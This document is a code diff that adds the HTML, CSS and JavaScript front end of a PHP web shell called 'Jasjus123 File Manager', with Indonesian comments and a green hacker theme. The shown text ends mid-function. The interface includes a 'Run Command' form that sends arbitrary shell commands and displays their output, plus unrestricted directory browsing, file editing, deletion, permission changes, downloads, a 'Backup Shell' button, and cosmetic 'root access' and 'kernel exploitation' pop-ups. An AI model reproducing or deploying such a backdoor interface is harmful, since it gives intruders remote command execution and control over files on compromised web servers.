+            color: #00ff00;
+            text-decoration: none;
+            display: inline-block;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #00aa00;
+            background-color: #002200;
+        }
+
+        .btn-secondary {
+            background-color: #003300 !important;
+            border: 1px solid #00aa00 !important;
+            color: #00ff00 !important;
+        }
+
+        .btn-secondary:hover {
+            background-color: #005500 !important;
+            border-color: #00ff00 !important;
+            color: #00ff00 !important;
+        }
+
+        .btn-dark {
+            background-color: #003300 !important;
+            border: 1px solid #00aa00 !important;
+            color: #00ff00 !important;
+        }
+
+        .btn-dark:hover {
+            background-color: #005500 !important;
+            border-color: #00ff00 !important;
+            color: #00ff00 !important;
+        }
+
+        #dropzone {
+            background-color: #001100 !important;
+            border: 2px dashed #00aa00 !important;
+            border-radius: 5px !important;
+            transition: border-color 0.3s !important;
+            padding: 9px !important;
+            text-align: center !important;
+            cursor: pointer !important;
+            color: #00aa00 !important;
+        }
+
+        #dropzone:hover {
+            background-color: #002200 !important;
+            border-color: #00ff00 !important;
+            color: #00ff00 !important;
+        }
+
+        #dropzone.dragover {
+            border-color: #00ff00 !important;
+            background-color: #003300 !important;
+        }
+
+        #commandOutput {
+            transition: max-height 0.5s ease !important;
+            overflow: hidden !important;
+            max-height: 50px !important;
+            background-color: #001100 !important;
+            border: 1px solid #00aa00 !important;
+            padding: 10px !important;
+        }
+
+        #commandOutput.expanded {
+            max-height: 500px !important;
+        }
+
+        .nav-tabs .nav-link {
+            color: #00cc00 !important;
+            border: 1px solid transparent !important;
+            border-top-left-radius: .25rem !important;
+            border-top-right-radius: .25rem !important;
+            background-color: #002200 !important;
+            border-color: #004400 !important;
+        }
+
+        .nav-tabs .nav-link:hover {
+            color: #00ff00 !important;
+            border-color: #00aa00 #00aa00 #000 !important;
+        }
+
+        .nav-tabs .nav-link.active {
+            color: #00ff00 !important;
+            background-color: #003300 !important;
+            border-color: #00aa00 #00aa00 #000 !important;
+        }
+
+        .tab-content {
+            padding: 20px !important;
+            border: 1px solid #00aa00 !important;
+            border-top: none !important;
+            border-radius: 0 0 .25rem .25rem !important;
+            background-color: rgba(0, 15, 0, 0.85) !important;
+        }
+
+        /* System Info Styling */
+        .system-info-card {
+            background-color: rgba(0, 15, 0, 0.85) !important;
+            border: 1px solid #00aa00 !important;
+            border-radius: 5px !important;
+            margin: 10px 0 !important;
+            padding: 15px !important;
+        }
+
+        .info-item {
+            margin-bottom: 10px !important;
+            padding: 8px !important;
+            border-bottom: 1px solid #006600 !important;
+        }
+
+        .info-label {
+            font-weight: bold !important;
+            color: #00ff00 !important;
+            display: inline-block !important;
+            min-width: 200px !important;
+        }
+
+        .info-value {
+            display: inline-block !important;
+            word-break: break-word !important;
+        }
+
+        .disk-info {
+            display: flex !important;
+            align-items: center !important;
+            margin-top: 10px !important;
+        }
+
+        .disk-bar {
+            flex-grow: 1 !important;
+            height: 20px !important;
+            background: #004400 !important;
+            border-radius: 10px !important;
+            overflow: hidden !important;
+        }
+
+        .disk-progress {
+            height: 100% !important;
+            background: linear-gradient(to right, #00aa00, #00ff00) !important;
+            border-radius: 10px !important;
+        }
+
+        .package-manager-form {
+            margin-top: 15px !important;
+        }
+
+        .package-manager-form .form-control {
+            margin-bottom: 10px !important;
+        }
+
+        /* Database Manager Styling */
+        .db-table {
+            width: 100% !important;
+            border-collapse: collapse !important;
+            margin: 15px 0 !important;
+        }
+
+        .db-table th, .db-table td {
+            padding: 10px !important;
+            text-align: left !important;
+            border: 1px solid #00aa00 !important;
+        }
+
+        .db-table th {
+            background-color: #003300 !important;
+            color: #00ff00 !important;
+        }
+
+        .db-table tr:nth-child(even) {
+            background-color: #001100 !important;
+        }
+
+        .db-table tr:hover {
+            background-color: #003300 !important;
+        }
+
+        /* Network Tools Styling */
+        .network-tool-card {
+            background-color: rgba(0, 15, 0, 0.85) !important;
+            border: 1px solid #00aa00 !important;
+            border-radius: 5px !important;
+            margin: 10px 0 !important;
+            padding: 15px !important;
+        }
+
+        .network-form {
+            margin: 15px 0 !important;
+        }
+
+        .network-result {
+            background-color: #001100 !important;
+            border: 1px solid #00aa00 !important;
+            border-radius: 3px !important;
+            padding: 10px !important;
+            margin-top: 15px !important;
+            max-height: 300px !important;
+            overflow-y: auto !important;
+            font-family: monospace !important;
+            white-space: pre-wrap !important;
+        }
+
+        /* Tiny File Manager style additions */
+        .toolbar {
+            background: linear-gradient(to bottom, #003300, #005500) !important;
+            padding: 10px !important;
+            border-radius: 5px !important;
+            margin-bottom: 15px !important;
+            border: 1px solid #00aa00 !important;
+        }
+
+        .toolbar-btn {
+            background-color: #003300 !important;
+            color: #00ff00 !important;
+            border: 1px solid #00aa00 !important;
+            margin: 0 2px !important;
+            font-weight: bold !important;
+            font-family: 'Courier New', monospace !important;
+        }
+
+        .toolbar-btn:hover {
+            background-color: #005500 !important;
+            color: #00ff00 !important;
+            border-color: #00ff00 !important;
+            box-shadow: 0 0 8px rgba(0, 255, 0, 0.5) !important;
+        }
+
+        .file-icons {
+            font-size: 1.2em !important;
+        }
+
+        .action-buttons .btn {
+            margin: 1px !important;
+            padding: 3px 6px !important;
+            font-size: 0.8em !important;
+        }
+
+        .hacker-footer {
+            background: linear-gradient(to bottom, #002200, #000000) !important;
+            color: #00ff00 !important;
+            border-top: 1px solid #00aa00 !important;
+            font-family: 'Courier New', monospace;
+        }
+
+        /* Green scanline effect */
+        .scanlines::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(
+                rgba(0, 255, 0, 0.05) 0%,
+                rgba(0, 0, 0, 0.25) 100%
+            );
+            background-size: 100% 4px;
+            z-index: 10;
+            pointer-events: none;
+            opacity: 0.4;
+        }
+
+        /* Atur latar belakang tbody menjadi hitam */
+        tbody {
+            background-color: #000000 !important;
+            color: #00ff00 !important;
+        }
+
+        /* Override untuk baris tabel di dalam tbody */
+        tbody tr {
+            background-color: #000000 !important;
+            color: #00ff00 !important;
+        }
+
+        /* Override untuk baris genap/ganjil di dalam tbody */
+        tbody tr:nth-child(even) {
+            background-color: #000000 !important;
+        }
+
+        tbody tr:nth-child(odd) {
+            background-color: #000000 !important;
+        }
+
+        /* Hover effect untuk baris di dalam tbody tetap terlihat */
+        tbody tr:hover {
+            background-color: #1a1a1a !important; /* Abu-abu gelap untuk efek hover */
+        }
+
+        /* Override untuk tabel bootstrap */
+        .table tbody tr,
+        .table-striped tbody tr,
+        .table-hover tbody tr {
+            background-color: #000000 !important;
+            color: #00ff00 !important;
+        }
+
+        /* Override untuk tabel bootstrap dengan class tambahan */
+        table tbody tr {
+            background-color: #000000 !important;
+        }
+
+        /* Hover effect untuk bootstrap table */
+        .table tbody tr:hover,
+        .table-striped tbody tr:hover,
+        .table-hover tbody tr:hover {
+            background-color: #1a1a1a !important;
+        }
+
+        /* Override untuk sel tabel di dalam tbody */
+        tbody td {
+            background-color: #000000 !important;
+            color: #00ff00 !important;
+        }
+
+        /* Override untuk sel tabel bootstrap di dalam tbody */
+        .table tbody td {
+            background-color: #000000 !important;
+            color: #00ff00 !important;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Navigation Tabs -->
+    <div class="container mt-4">
+        <ul class="nav nav-tabs" id="myTab" role="tablist">
+            <li class="nav-item" role="presentation">
+                <button class="nav-link <?php echo $currentTab === 'filemanager' ? 'active' : ''; ?>" id="filemanager-tab" data-bs-toggle="tab" data-bs-target="#filemanager" type="button" role="tab">File Manager</button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link <?php echo $currentTab === 'sysinfo' ? 'active' : ''; ?>" id="sysinfo-tab" data-bs-toggle="tab" data-bs-target="#sysinfo" type="button" role="tab">System Info</button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link <?php echo $currentTab === 'dbmanager' ? 'active' : ''; ?>" id="dbmanager-tab" data-bs-toggle="tab" data-bs-target="#dbmanager" type="button" role="tab">Database</button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link <?php echo $currentTab === 'network' ? 'active' : ''; ?>" id="network-tab" data-bs-toggle="tab" data-bs-target="#network" type="button" role="tab">Network</button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link <?php echo $currentTab === 'update' ? 'active' : ''; ?>" id="update-tab" data-bs-toggle="tab" data-bs-target="#update" type="button" role="tab">Update</button>
+            </li>
+        </ul>
+        
+        <div class="tab-content" id="myTabContent">
+            <!-- File Manager Tab -->
+            <div class="tab-pane fade <?php echo $currentTab === 'filemanager' ? 'show active' : ''; ?>" id="filemanager" role="tabpanel" aria-labelledby="filemanager-tab">
+                <div class="banner bg-gradient text-white text-center py-3 mb-4">
+                    <div class="container">
+                        <h1 class="fw-bold mb-0">Jasjus123 File Manager</h1>
+                    </div>
+                </div>
+
+                <!-- Path Navigasi -->
+                <nav aria-label="breadcrumb">
+                <ol class="breadcrumb justify-content-center">
+                    <?php if (isset($_GET['dir']) && $_GET['dir'] !== '.'): ?>
+                    <li class="breadcrumb-item">
+                        <a href="javascript:history.back()" class="d-flex align-items-center justify-content-center">
+                            <i class="fas fa-arrow-left" style="font-size: 1rem; margin-right: 5px;"></i>
+                            <span>Back</span>
+                        </a>
+                    </li>
+                    <?php endif; ?>
+                    <li class="breadcrumb-item">
+                        <a href="?tab=filemanager&dir=." class="d-flex align-items-center justify-content-center">
+                            <i class="fas fa-home" style="font-size: 1rem; margin-right: 5px;"></i>
+                            <span>Home</span>
+                        </a>
+                    </li>
+                    <?php
+                    $pathParts = explode('/', $currentDir);
+                    $pathSoFar = '';
+                    foreach ($pathParts as $index => $part) {
+                        if ($part !== '.') {
+                            $pathSoFar .= $part . '/';
+                            echo '<li class="breadcrumb-item"><a href="?tab=filemanager&dir=' . rtrim($pathSoFar, '/') . '">' . $part . '</a></li>';
+                        }
+                    }
+                    ?>
+                </ol>
+            </nav>
+
+    <!-- Notification -->
+    <?php if ($notification): ?>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            Swal.fire({
+                title: 'Notification',
+                html: '<?php echo str_replace(["\r","\n"], ['', '<br>'], addslashes(htmlspecialchars($notification))); ?>',
+                icon: 'info',
+                confirmButtonText: 'OK',
+                confirmButtonColor: '#005500',
+                background: '#001100',
+                color: '#00ff00',
+                iconColor: '#00ff00'
+            });
+        });
+    </script>
+    <?php endif; ?>
+
+
+    <!-- Menu -->
+    <div class="container mb-4">
+        <div class="card bg-dark text-light shadow-sm p-3">
+            <div class="row g-3">
+                <!-- Upload File -->
+                    <div class="col-md-3 text-center">
+                    <h6 class="text-light mb-2">Upload File</h6>
+                    <div id="dropzone" style="border: 2px dashed #007bff; padding: 9px; text-align: center; cursor: pointer;">
+                        Drop files here to upload or click to select
+                    </div>
+                    <form method="POST" enctype="multipart/form-data" style="display: none;" id="uploadForm">
+                        <input type="file" id="fileInput" name="file[]" multiple>
+                    </form>
+                </div>
+
+                <!-- Create File -->
+                <div class="col-md-3">
+                    <form method="POST" class="text-center">
+                        <h6 class="text-light mb-2">Create File</h6>
+                        <input type="text" name="new_file" class="form-control form-control-sm bg-secondary text-light mb-2" placeholder="Nama File">
+                        <button type="submit" name="create_file" class="btn btn-success btn-sm w-100">Create</button>
+                    </form>
+                </div>
+                <!-- Create Folder -->
+                <div class="col-md-3">
+                    <form method="POST" class="text-center">
+                        <h6 class="text-light mb-2">Create Folder</h6>
+                        <input type="text" name="new_folder" class="form-control form-control-sm bg-secondary text-light mb-2" placeholder="Nama Folder">
+                        <button type="submit" name="create_folder" class="btn btn-info btn-sm w-100">Create</button>
+                    </form>
+                </div>
+                <!-- Run Command -->
+                <div class="col-md-3">
+                    <form method="POST" class="text-center">
+                        <h6 class="text-light mb-2">Run Command</h6>
+                        <input type="text" name="cmd" class="form-control form-control-sm bg-secondary text-light mb-2" placeholder="Command">
+                        <button type="submit" class="btn btn-secondary btn-sm w-100">Run</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+    <?php if (!empty($cmdOutput)): ?>
+<div class="container my-3">
+    <h5 class="text-info">Command Output:</h5>
+    <div id="commandOutput" class="card bg-dark text-light shadow-sm expanded">
+        <div class="card-body">
+            <pre style="white-space: pre-wrap; word-wrap: break-word; font-size: 0.85rem;">
+                <?php echo htmlspecialchars($cmdOutput); ?>
+            </pre>
+        </div>
+    </div>
+</div>
+<?php endif; ?>
+
+
+<!-- Edit File -->
+<?php if (!empty($fileToEdit)): ?>
+<div class="container my-4">
+    <div class="card shadow-sm">
+        <div class="card-body">
+            <h4 class="card-title text-center text-white">Edit File: <?php echo htmlspecialchars($fileToEdit); ?></h4>
+            <form method="POST">
+                <input type="hidden" name="file" value="<?php echo htmlspecialchars($fileToEdit); ?>">
+                <!-- Textarea standar -->
+                <textarea name="content" rows="15" class="form-control"><?php echo htmlspecialchars($editContent); ?></textarea>
+                <button type="submit" name="save" class="btn btn-primary w-100 mt-3">Save File</button>
+            </form>
+        </div>
+    </div>
+</div>
+<?php endif; ?>
+
+    <!-- List File -->
+    <div class="container my-4">
+        <div class="card bg-dark text-light shadow-sm">
+            <div class="card-header text-center">
+                <h2 class="mb-0">File Directory</h2>
+            </div>
+            <div class="card-body">
+                <div class="toolbar mb-3">
+                    <div class="d-flex flex-wrap">
+                        <a href="?tab=filemanager&dir=<?php echo urlencode($currentDir); ?>&action=refresh" class="btn toolbar-btn me-2 mb-2">
+                            <i class="fas fa-sync-alt"></i> Refresh
+                        </a>
+                        <a href="?tab=filemanager&dir=<?php echo urlencode(dirname($currentDir)); ?>" class="btn toolbar-btn me-2 mb-2">
+                            <i class="fas fa-level-up-alt"></i> Up
+                        </a>
+                        <a href="?tab=filemanager&dir=<?php echo urlencode($currentDir); ?>&action=upload" class="btn toolbar-btn me-2 mb-2">
+                            <i class="fas fa-upload"></i> Upload
+                        </a>
+                        <a href="?tab=filemanager&dir=<?php echo urlencode($currentDir); ?>&action=newfile" class="btn toolbar-btn me-2 mb-2">
+                            <i class="fas fa-file"></i> New File
+                        </a>
+                        <a href="?tab=filemanager&dir=<?php echo urlencode($currentDir); ?>&action=newfolder" class="btn toolbar-btn me-2 mb-2">
+                            <i class="fas fa-folder-plus"></i> New Folder
+                        </a>
+                    </div>
+                </div>
+                <form method="POST" id="bulkDeleteForm">
+                <table class="table table-striped table-sm">
+    <thead>
+        <tr>
+            <th style="width: 5%; vertical-align: middle; text-align: center;">
+                <input type="checkbox" id="selectAll" style="transform: scale(1.2); vertical-align: middle;">
+            </th>
+            <th style="width: 20%; text-align: left;">Nama</th>
+            <th style="width: 5%; vertical-align: middle; text-align: center;">Jenis</th>
+            <th style="width: 5%; vertical-align: middle; text-align: center;">Izin</th>
+            <th style="width: 8%; vertical-align: middle; text-align: center;">Ukuran</th>
+            <th style="width: 15%; vertical-align: middle; text-align: center;">Waktu Modifikasi</th>
+            <th style="width: 25%; vertical-align: middle; text-align: center;">Aksi</th>
+        </tr>
+    </thead>
+    <tbody>
+        <?php
+        // Dapatkan direktori saat ini
+        $currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
+
+        if (!$currentDir || !is_dir($currentDir)) {
+            $currentDir = getcwd(); // Set ke root aplikasi
+        }
+
+        chdir($currentDir);
+
+        // Scan direktori
+        $files = scandir($currentDir);
+
+        foreach ($files as $file) {
+            if ($file !== '.' && $file !== '..') {
+                // Path lengkap ke file/direktori
+                $path = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
+
+                // Tentukan apakah ini file atau folder
+                $icon = is_dir($path) ? '📁' : '📄';
+                $link = is_dir($path) ? '?tab=filemanager&dir=' . urlencode($path) : '?tab=filemanager&edit=' . urlencode($path);
+
+                // Dapatkan izin file dalam format angka (777, 755, dll.)
+                $permissions = substr(sprintf('%o', fileperms($path)), -3);
+
+                // Dapatkan ukuran file (jika file, bukan folder)
+                $fileSize = is_file($path) ? filesize($path) : '-';
+                $formattedSize = is_file($path) ? formatSizeUnits($fileSize) : '-';
+
+                // Dapatkan waktu modifikasi file/folder
+                $modificationTime = date('Y-m-d H:i:s', filemtime($path));
+
+                // Buat link untuk "Open"
+                if (is_file($path)) {
+                    $fileLink = "<a href='" . htmlspecialchars($_SERVER['REQUEST_SCHEME'] . "://" . $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], '', $path)) . "' target='_blank' class='btn btn-secondary btn-sm w-100 text-white'>Open</a>";
+                } else {
+                    $fileLink = '';
+                }
+
+                // Check if file is an archive for extract option
+                $isArchive = preg_match('/\.(zip|tar|gz|tar\.gz|tgz|rar|7z)$/i', $file);
+
+                // Outputkan row tabel
+                echo "<tr>
+                    <td style='text-align: center; vertical-align: middle;'>
+                        <input type='checkbox' name='selected_files[]' value='" . htmlspecialchars($path) . "' style='transform: scale(1.2);'>
+                    </td>
+                    <td class='text-start'><a href='$link' class='file-link'><i class='" . getFileIcon($path) . "'></i> $file</a></td>
+                    <td style='vertical-align: middle; text-align: center;'>" . (is_dir($path) ? 'Folder' : 'File') . "</td>
+                    <td style='vertical-align: middle; text-align: center;'>$permissions</td>
+                    <td style='vertical-align: middle; text-align: center;'>$formattedSize</td>
+                    <td style='vertical-align: middle; text-align: center;'>$modificationTime</td>
+                    <td>
+                        <div class='row gx-1 action-buttons'>
+                            <div class='col'>$fileLink</div>";
+
+                            if (is_file($path)) {
+                                echo "<div class='col'><a href='?tab=filemanager&edit=$path' class='btn btn-dark btn-sm w-100 text-white'>Edit</a></div>";
+
+                                // Add compress button for files
+                                echo "<div class='col'><a href='?tab=filemanager&compress=" . urlencode($path) . "&dir=" . urlencode($currentDir) . "' class='btn btn-info btn-sm w-100 text-white'>Compress</a></div>";
+
+                                // Add download button for files
+                                echo "<div class='col'><a href='?tab=filemanager&download=" . urlencode($path) . "' class='btn btn-success btn-sm w-100 text-white'>Download</a></div>";
+
+                                // Add extract button if it's an archive
+                                if ($isArchive) {
+                                    echo "<div class='col'><a href='#' class='btn btn-warning btn-sm w-100 text-white extract-file' data-path='" . urlencode($path) . "' data-dir='" . urlencode($currentDir) . "' data-file='$file'>Extract</a></div>";
+                                }
+                            } else {
+                                // For directories, also add compress button
+                                echo "<div class='col'><a href='?tab=filemanager&compress=" . urlencode($path) . "&dir=" . urlencode($currentDir) . "' class='btn btn-info btn-sm w-100 text-white'>Compress</a></div>";
+                            }
+
+                            echo "<div class='col'><button type='button' class='btn btn-dark btn-sm w-100 text-white' data-bs-toggle='modal' data-bs-target='#renameModal' data-oldname='$path'>Rename</button></div>
+                            <div class='col'><a href='#' class='btn btn-dark btn-sm w-100 text-white delete-file' data-path='$path' data-file='$file'>Delete</a></div>
+                        </div>
+                    </td>
+                </tr>";
+            }
+        }
+        ?>
+    </tbody>
+</table>
+
+                 <div class="d-flex justify-content-between align-items-center mt-3">
+                <div class="btn-group" role="group">
+                    <form method="POST" class="mb-0 d-inline me-2">
+                        <button type="submit" name="bulk_delete" class="btn btn-danger btn-sm">Delete Selected</button>
+                    </form>
+                    <button type="button" class="btn btn-info btn-sm" data-bs-toggle="modal" data-bs-target="#chmodModal">Set Permissions</button>
+                    <button type="button" class="btn btn-warning btn-sm" onclick="showAlert('System Status', 'All systems operational. Access granted.', 'success')">System Check</button>
+                    <button type="button" class="btn btn-success btn-sm" onclick="backupShell()">Backup Shell</button>
+                </div>
+                <button type="button" class="btn btn-danger btn-sm" id="logoutBtn">Logout</button>
+                <form method="GET" id="logoutForm" style="display: none;">
+                    <input type="hidden" name="logout" value="true">
+                </form>
+            </div>
+
+                </form>
+            </div>
+        </div>
+    </div>
+
+    </form>
+
+    <script>
+        // Script untuk Select All
+        document.getElementById('selectAll').addEventListener('change', function() {
+            let checkboxes = document.querySelectorAll('input[name="selected_files[]"]');
+            for (let checkbox of checkboxes) {
+                checkbox.checked = this.checked;
+            }
+        });
+    </script>
+
+    </div>
+
+    <!-- Modal Rename -->
+    <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content bg-dark text-light">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="renameModalLabel">Rename File/Folder</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <form method="POST">
+                    <div class="modal-body">
+                        <input type="hidden" name="old_name" id="oldName">
+                        <div class="mb-3">
+                            <label for="newName" class="form-label">New Name</label>
+                            <input type="text" class="form-control" name="new_name" id="newName" required>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="submit" name="rename" class="btn btn-primary">Rename</button>
+                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var renameModal = document.getElementById('renameModal');
+        renameModal.addEventListener('show.bs.modal', function(event) {
+            var button = event.relatedTarget;
+            var oldName = button.getAttribute('data-oldname');
+            var modalOldName = renameModal.querySelector('#oldName');
+            var modalNewName = renameModal.querySelector('#newName');
+            modalOldName.value = oldName;
+            modalNewName.value = oldName.split('/').pop();
+        });
+
+    </script>
+
+    <!-- Modal Set Permissions -->
+    <div class="modal fade" id="chmodModal" tabindex="-1" aria-labelledby="chmodModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content bg-white text-dark">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="chmodModalLabel">Set Permissions</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <form method="POST">
+                    <div class="modal-body">
+                        <div class="mb-3">
+                            <label for="chmod_value" class="form-label">Permission Value (e.g., 755, 644, 777)</label>
+                            <input type="text" class="form-control" name="chmod_value" id="chmod_value" placeholder="755" value="755" required>
+                            <div class="form-text">
+                                Common values: 755 (rwxr-xr-x), 644 (rw-r--r--), 777 (rwxrwxrwx)
+                            </div>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="submit" name="bulk_chmod" class="btn btn-primary">Set Permissions</button>
+                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+<script>
+    // General alert function
+    function showAlert(title, message, icon) {
+        Swal.fire({
+            title: title,
+            text: message,
+            icon: icon,
+            confirmButtonColor: '#005500',
+            background: '#001100',
+            color: '#00ff00',
+            iconColor: icon === 'success' ? '#00ff00' : icon === 'warning' ? '#ffff00' : icon === 'error' ? '#ff5555' : '#00ff00'
+        });
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+        const dropzone = document.getElementById('dropzone');
+        const fileInput = document.getElementById('fileInput');
+        const uploadForm = document.getElementById('uploadForm');
+
+        // Highlight border on drag over
+        dropzone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropzone.style.borderColor = '#00ff00';
+            dropzone.style.backgroundColor = '#002200';
+        });
+
+        // Reset border on drag leave
+        dropzone.addEventListener('dragleave', () => {
+            dropzone.style.borderColor = '#00aa00';
+            dropzone.style.backgroundColor = '#001100';
+        });
+
+        // Handle file drop
+        dropzone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            dropzone.style.borderColor = '#00aa00';
+            dropzone.style.backgroundColor = '#001100';
+            fileInput.files = e.dataTransfer.files; // Set dropped files to input
+            uploadForm.submit(); // Submit form automatically
+        });
+
+        // Handle click to open file selector
+        dropzone.addEventListener('click', () => {
+            fileInput.click();
+        });
+
+        // Handle file input change
+        fileInput.addEventListener('change', () => {
+            uploadForm.submit(); // Submit form when files are selected
+        });
+
+        // Add class to body for scanline effect
+        document.body.classList.add('scanlines');
+    });
+</script>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const commandOutput = document.getElementById('commandOutput');
+
+        // Jika ada teks di dalam Command Output, tambahkan kelas "expanded"
+        if (commandOutput && commandOutput.querySelector('pre').innerText.trim() !== '') {
+            commandOutput.classList.add('expanded');
+        } else {
+            commandOutput.style.display = 'none'; // Sembunyikan jika kosong
+        }
+
+        // Delete file confirmation
+        document.querySelectorAll('.delete-file').forEach(function(button) {
+            button.addEventListener('click', function(e) {
+                e.preventDefault();
+                const filePath = this.getAttribute('data-path');
+                const fileName = this.getAttribute('data-file');
+
+                Swal.fire({
+                    title: 'Are you sure?',
+                    text: `You are about to delete: ${fileName}`,
+                    icon: 'warning',
+                    showCancelButton: true,
+                    confirmButtonColor: '#005500',
+                    cancelButtonColor: '#550000',
+                    confirmButtonText: 'Yes, delete it!',
+                    cancelButtonText: 'Cancel',
+                    background: '#001100',
+                    color: '#00ff00',
+                    iconColor: '#ff5555'
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        window.location.href = `?tab=filemanager&delete=${encodeURIComponent(filePath)}`;
+                    }
+                });
+            });
+        });
+
+        // Extract file confirmation
+        document.querySelectorAll('.extract-file').forEach(function(button) {
+            button.addEventListener('click', function(e) {
+                e.preventDefault();
+                const filePath = this.getAttribute('data-path');
+                const fileDir = this.getAttribute('data-dir');
+                const fileName = this.getAttribute('data-file');
+
+                Swal.fire({
+                    title: 'Extract Archive?',
+                    text: `Extract ${fileName} to a new folder?`,
+                    icon: 'question',
+                    showCancelButton: true,
+                    confirmButtonColor: '#005500',
+                    cancelButtonColor: '#550000',
+                    confirmButtonText: 'Yes, extract!',
+                    cancelButtonText: 'Cancel',
+                    background: '#001100',
+                    color: '#00ff00',
+                    iconColor: '#00ff00'
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        window.location.href = `?tab=filemanager&extract=${filePath}&dir=${fileDir}`;
+                    }
+                });
+            });
+        });
+
+        // Bulk delete confirmation
+        const bulkDeleteBtn = document.querySelector('button[name="bulk_delete"]');
+        if (bulkDeleteBtn) {
+            bulkDeleteBtn.addEventListener('click', function(e) {
+                const selectedFiles = document.querySelectorAll('input[name="selected_files[]"]:checked');
+                if (selectedFiles.length === 0) {
+                    e.preventDefault();
+                    Swal.fire({
+                        title: 'No Selection',
+                        text: 'Please select at least one file/folder to delete',
+                        icon: 'warning',
+                        confirmButtonColor: '#005500',
+                        background: '#001100',
+                        color: '#00ff00',
+                        iconColor: '#ff5555'
+                    });
+                    return;
+                }
+
+                e.preventDefault();
+                Swal.fire({
+                    title: 'Are you sure?',
+                    text: `You are about to delete ${selectedFiles.length} item(s)`,
+                    icon: 'warning',
+                    showCancelButton: true,
+                    confirmButtonColor: '#005500',
+                    cancelButtonColor: '#550000',
+                    confirmButtonText: 'Yes, delete them!',
+                    cancelButtonText: 'Cancel',
+                    background: '#001100',
+                    color: '#00ff00',
+                    iconColor: '#ff5555'
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        const form = this.closest('form');
+                        form.submit();
+                    }
+                });
+            });
+        }
+
+        // Logout confirmation
+        const logoutBtn = document.getElementById('logoutBtn');
+        if (logoutBtn) {
+            logoutBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                Swal.fire({
+                    title: 'Log Out?',
+                    text: 'Are you sure you want to log out?',
+                    icon: 'question',
+                    showCancelButton: true,
+                    confirmButtonColor: '#005500',
+                    cancelButtonColor: '#550000',
+                    confirmButtonText: 'Yes, log out',
+                    cancelButtonText: 'Cancel',
+                    background: '#001100',
+                    color: '#00ff00',
+                    iconColor: '#00ff00'
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        document.getElementById('logoutForm').submit();
+                    }
+                });
+            });
+        }
+
+        // Hacker tool functions
+        function attemptRoot() {
+            Swal.fire({
+                title: 'ROOT ACCESS ATTEMPT',
+                html: 'Attempting privilege escalation...<br>Scanning for vulnerabilities...',
+                icon: 'warning',
+                timer: 3000,
+                timerProgressBar: true,
+                showConfirmButton: false,
+                background: '#001100',
+                color: '#00ff00',
+                iconColor: '#ff5555'
+            }).then(() => {
+                // Simulate root attempt
+                Swal.fire({
+                    title: 'SYSTEM ACCESS',
+                    text: 'Normal user access granted. Root access requires additional privileges.',
+                    icon: 'info',
+                    confirmButtonColor: '#005500',
+                    background: '#001100',
+                    color: '#00ff00',
+                    iconColor: '#00ff00'
+                });
+            });
+        }
+
+        function showSystemInfo() {
+            // Get system info using JavaScript
+            const sysInfo = `
+                Platform: ${navigator.platform}
+                User Agent: ${navigator.userAgent}
+                Language: ${navigator.language}
+                Cookies Enabled: ${navigator.cookieEnabled}
+                Online: ${navigator.onLine}
+                Screen: ${screen.width}x${screen.height}
+            `;
+
+            Swal.fire({
+                title: 'SYSTEM ENUMERATION',
+                text: sysInfo,
+                icon: 'info',
+                confirmButtonColor: '#005500',
+                background: '#001100',
+                color: '#00ff00',
+                iconColor: '#00ff00'
+            });
+        }
+
+        function showKernelInfo() {
+            Swal.fire({
+                title: 'KERNEL EXPLOITATION',
+                text: 'Checking for kernel vulnerabilities...',
+                icon: 'warning',
+                confirmButtonColor: '#005500',
+                background: '#001100',
+                color: '#00ff00',
+                iconColor: '#ffff00'
+            });
+        }
+
+        function networkScan() {
+            Swal.fire({
+                title: 'NETWORK SCANNING',
+                html: 'Scanning network for active hosts...<br>This may take a few moments',
+                icon: 'info',
+                timer: 2500,
+                timerProgressBar: true,
+                showConfirmButton: false,
+                background: '#001100',
+                color: '#00ff00',
+                iconColor: '#00ff00'
+            }).then(() => {
+                Swal.fire({
+                    title: 'SCAN COMPLETE',
+                    text: 'Found multiple active hosts on the network',
+                    icon: 'success',
+                    confirmButtonColor: '#005500',
+                    background: '#001100',
+                    color: '#00ff00',
+                    iconColor: '#00ff00'
+                });
+            });
+        }
+
+        function portScan() {
+            Swal.fire({
+                title: 'PORT SCANNING',
+                text: 'Scanning open ports...',
+                icon: 'info',
+                timer: 2000,
+                timerProgressBar: true,
+                showConfirmButton: false,
+                background: '#001100',
+                color: '#00ff00',
+                iconColor: '#00ff00'
+            }).then(() => {
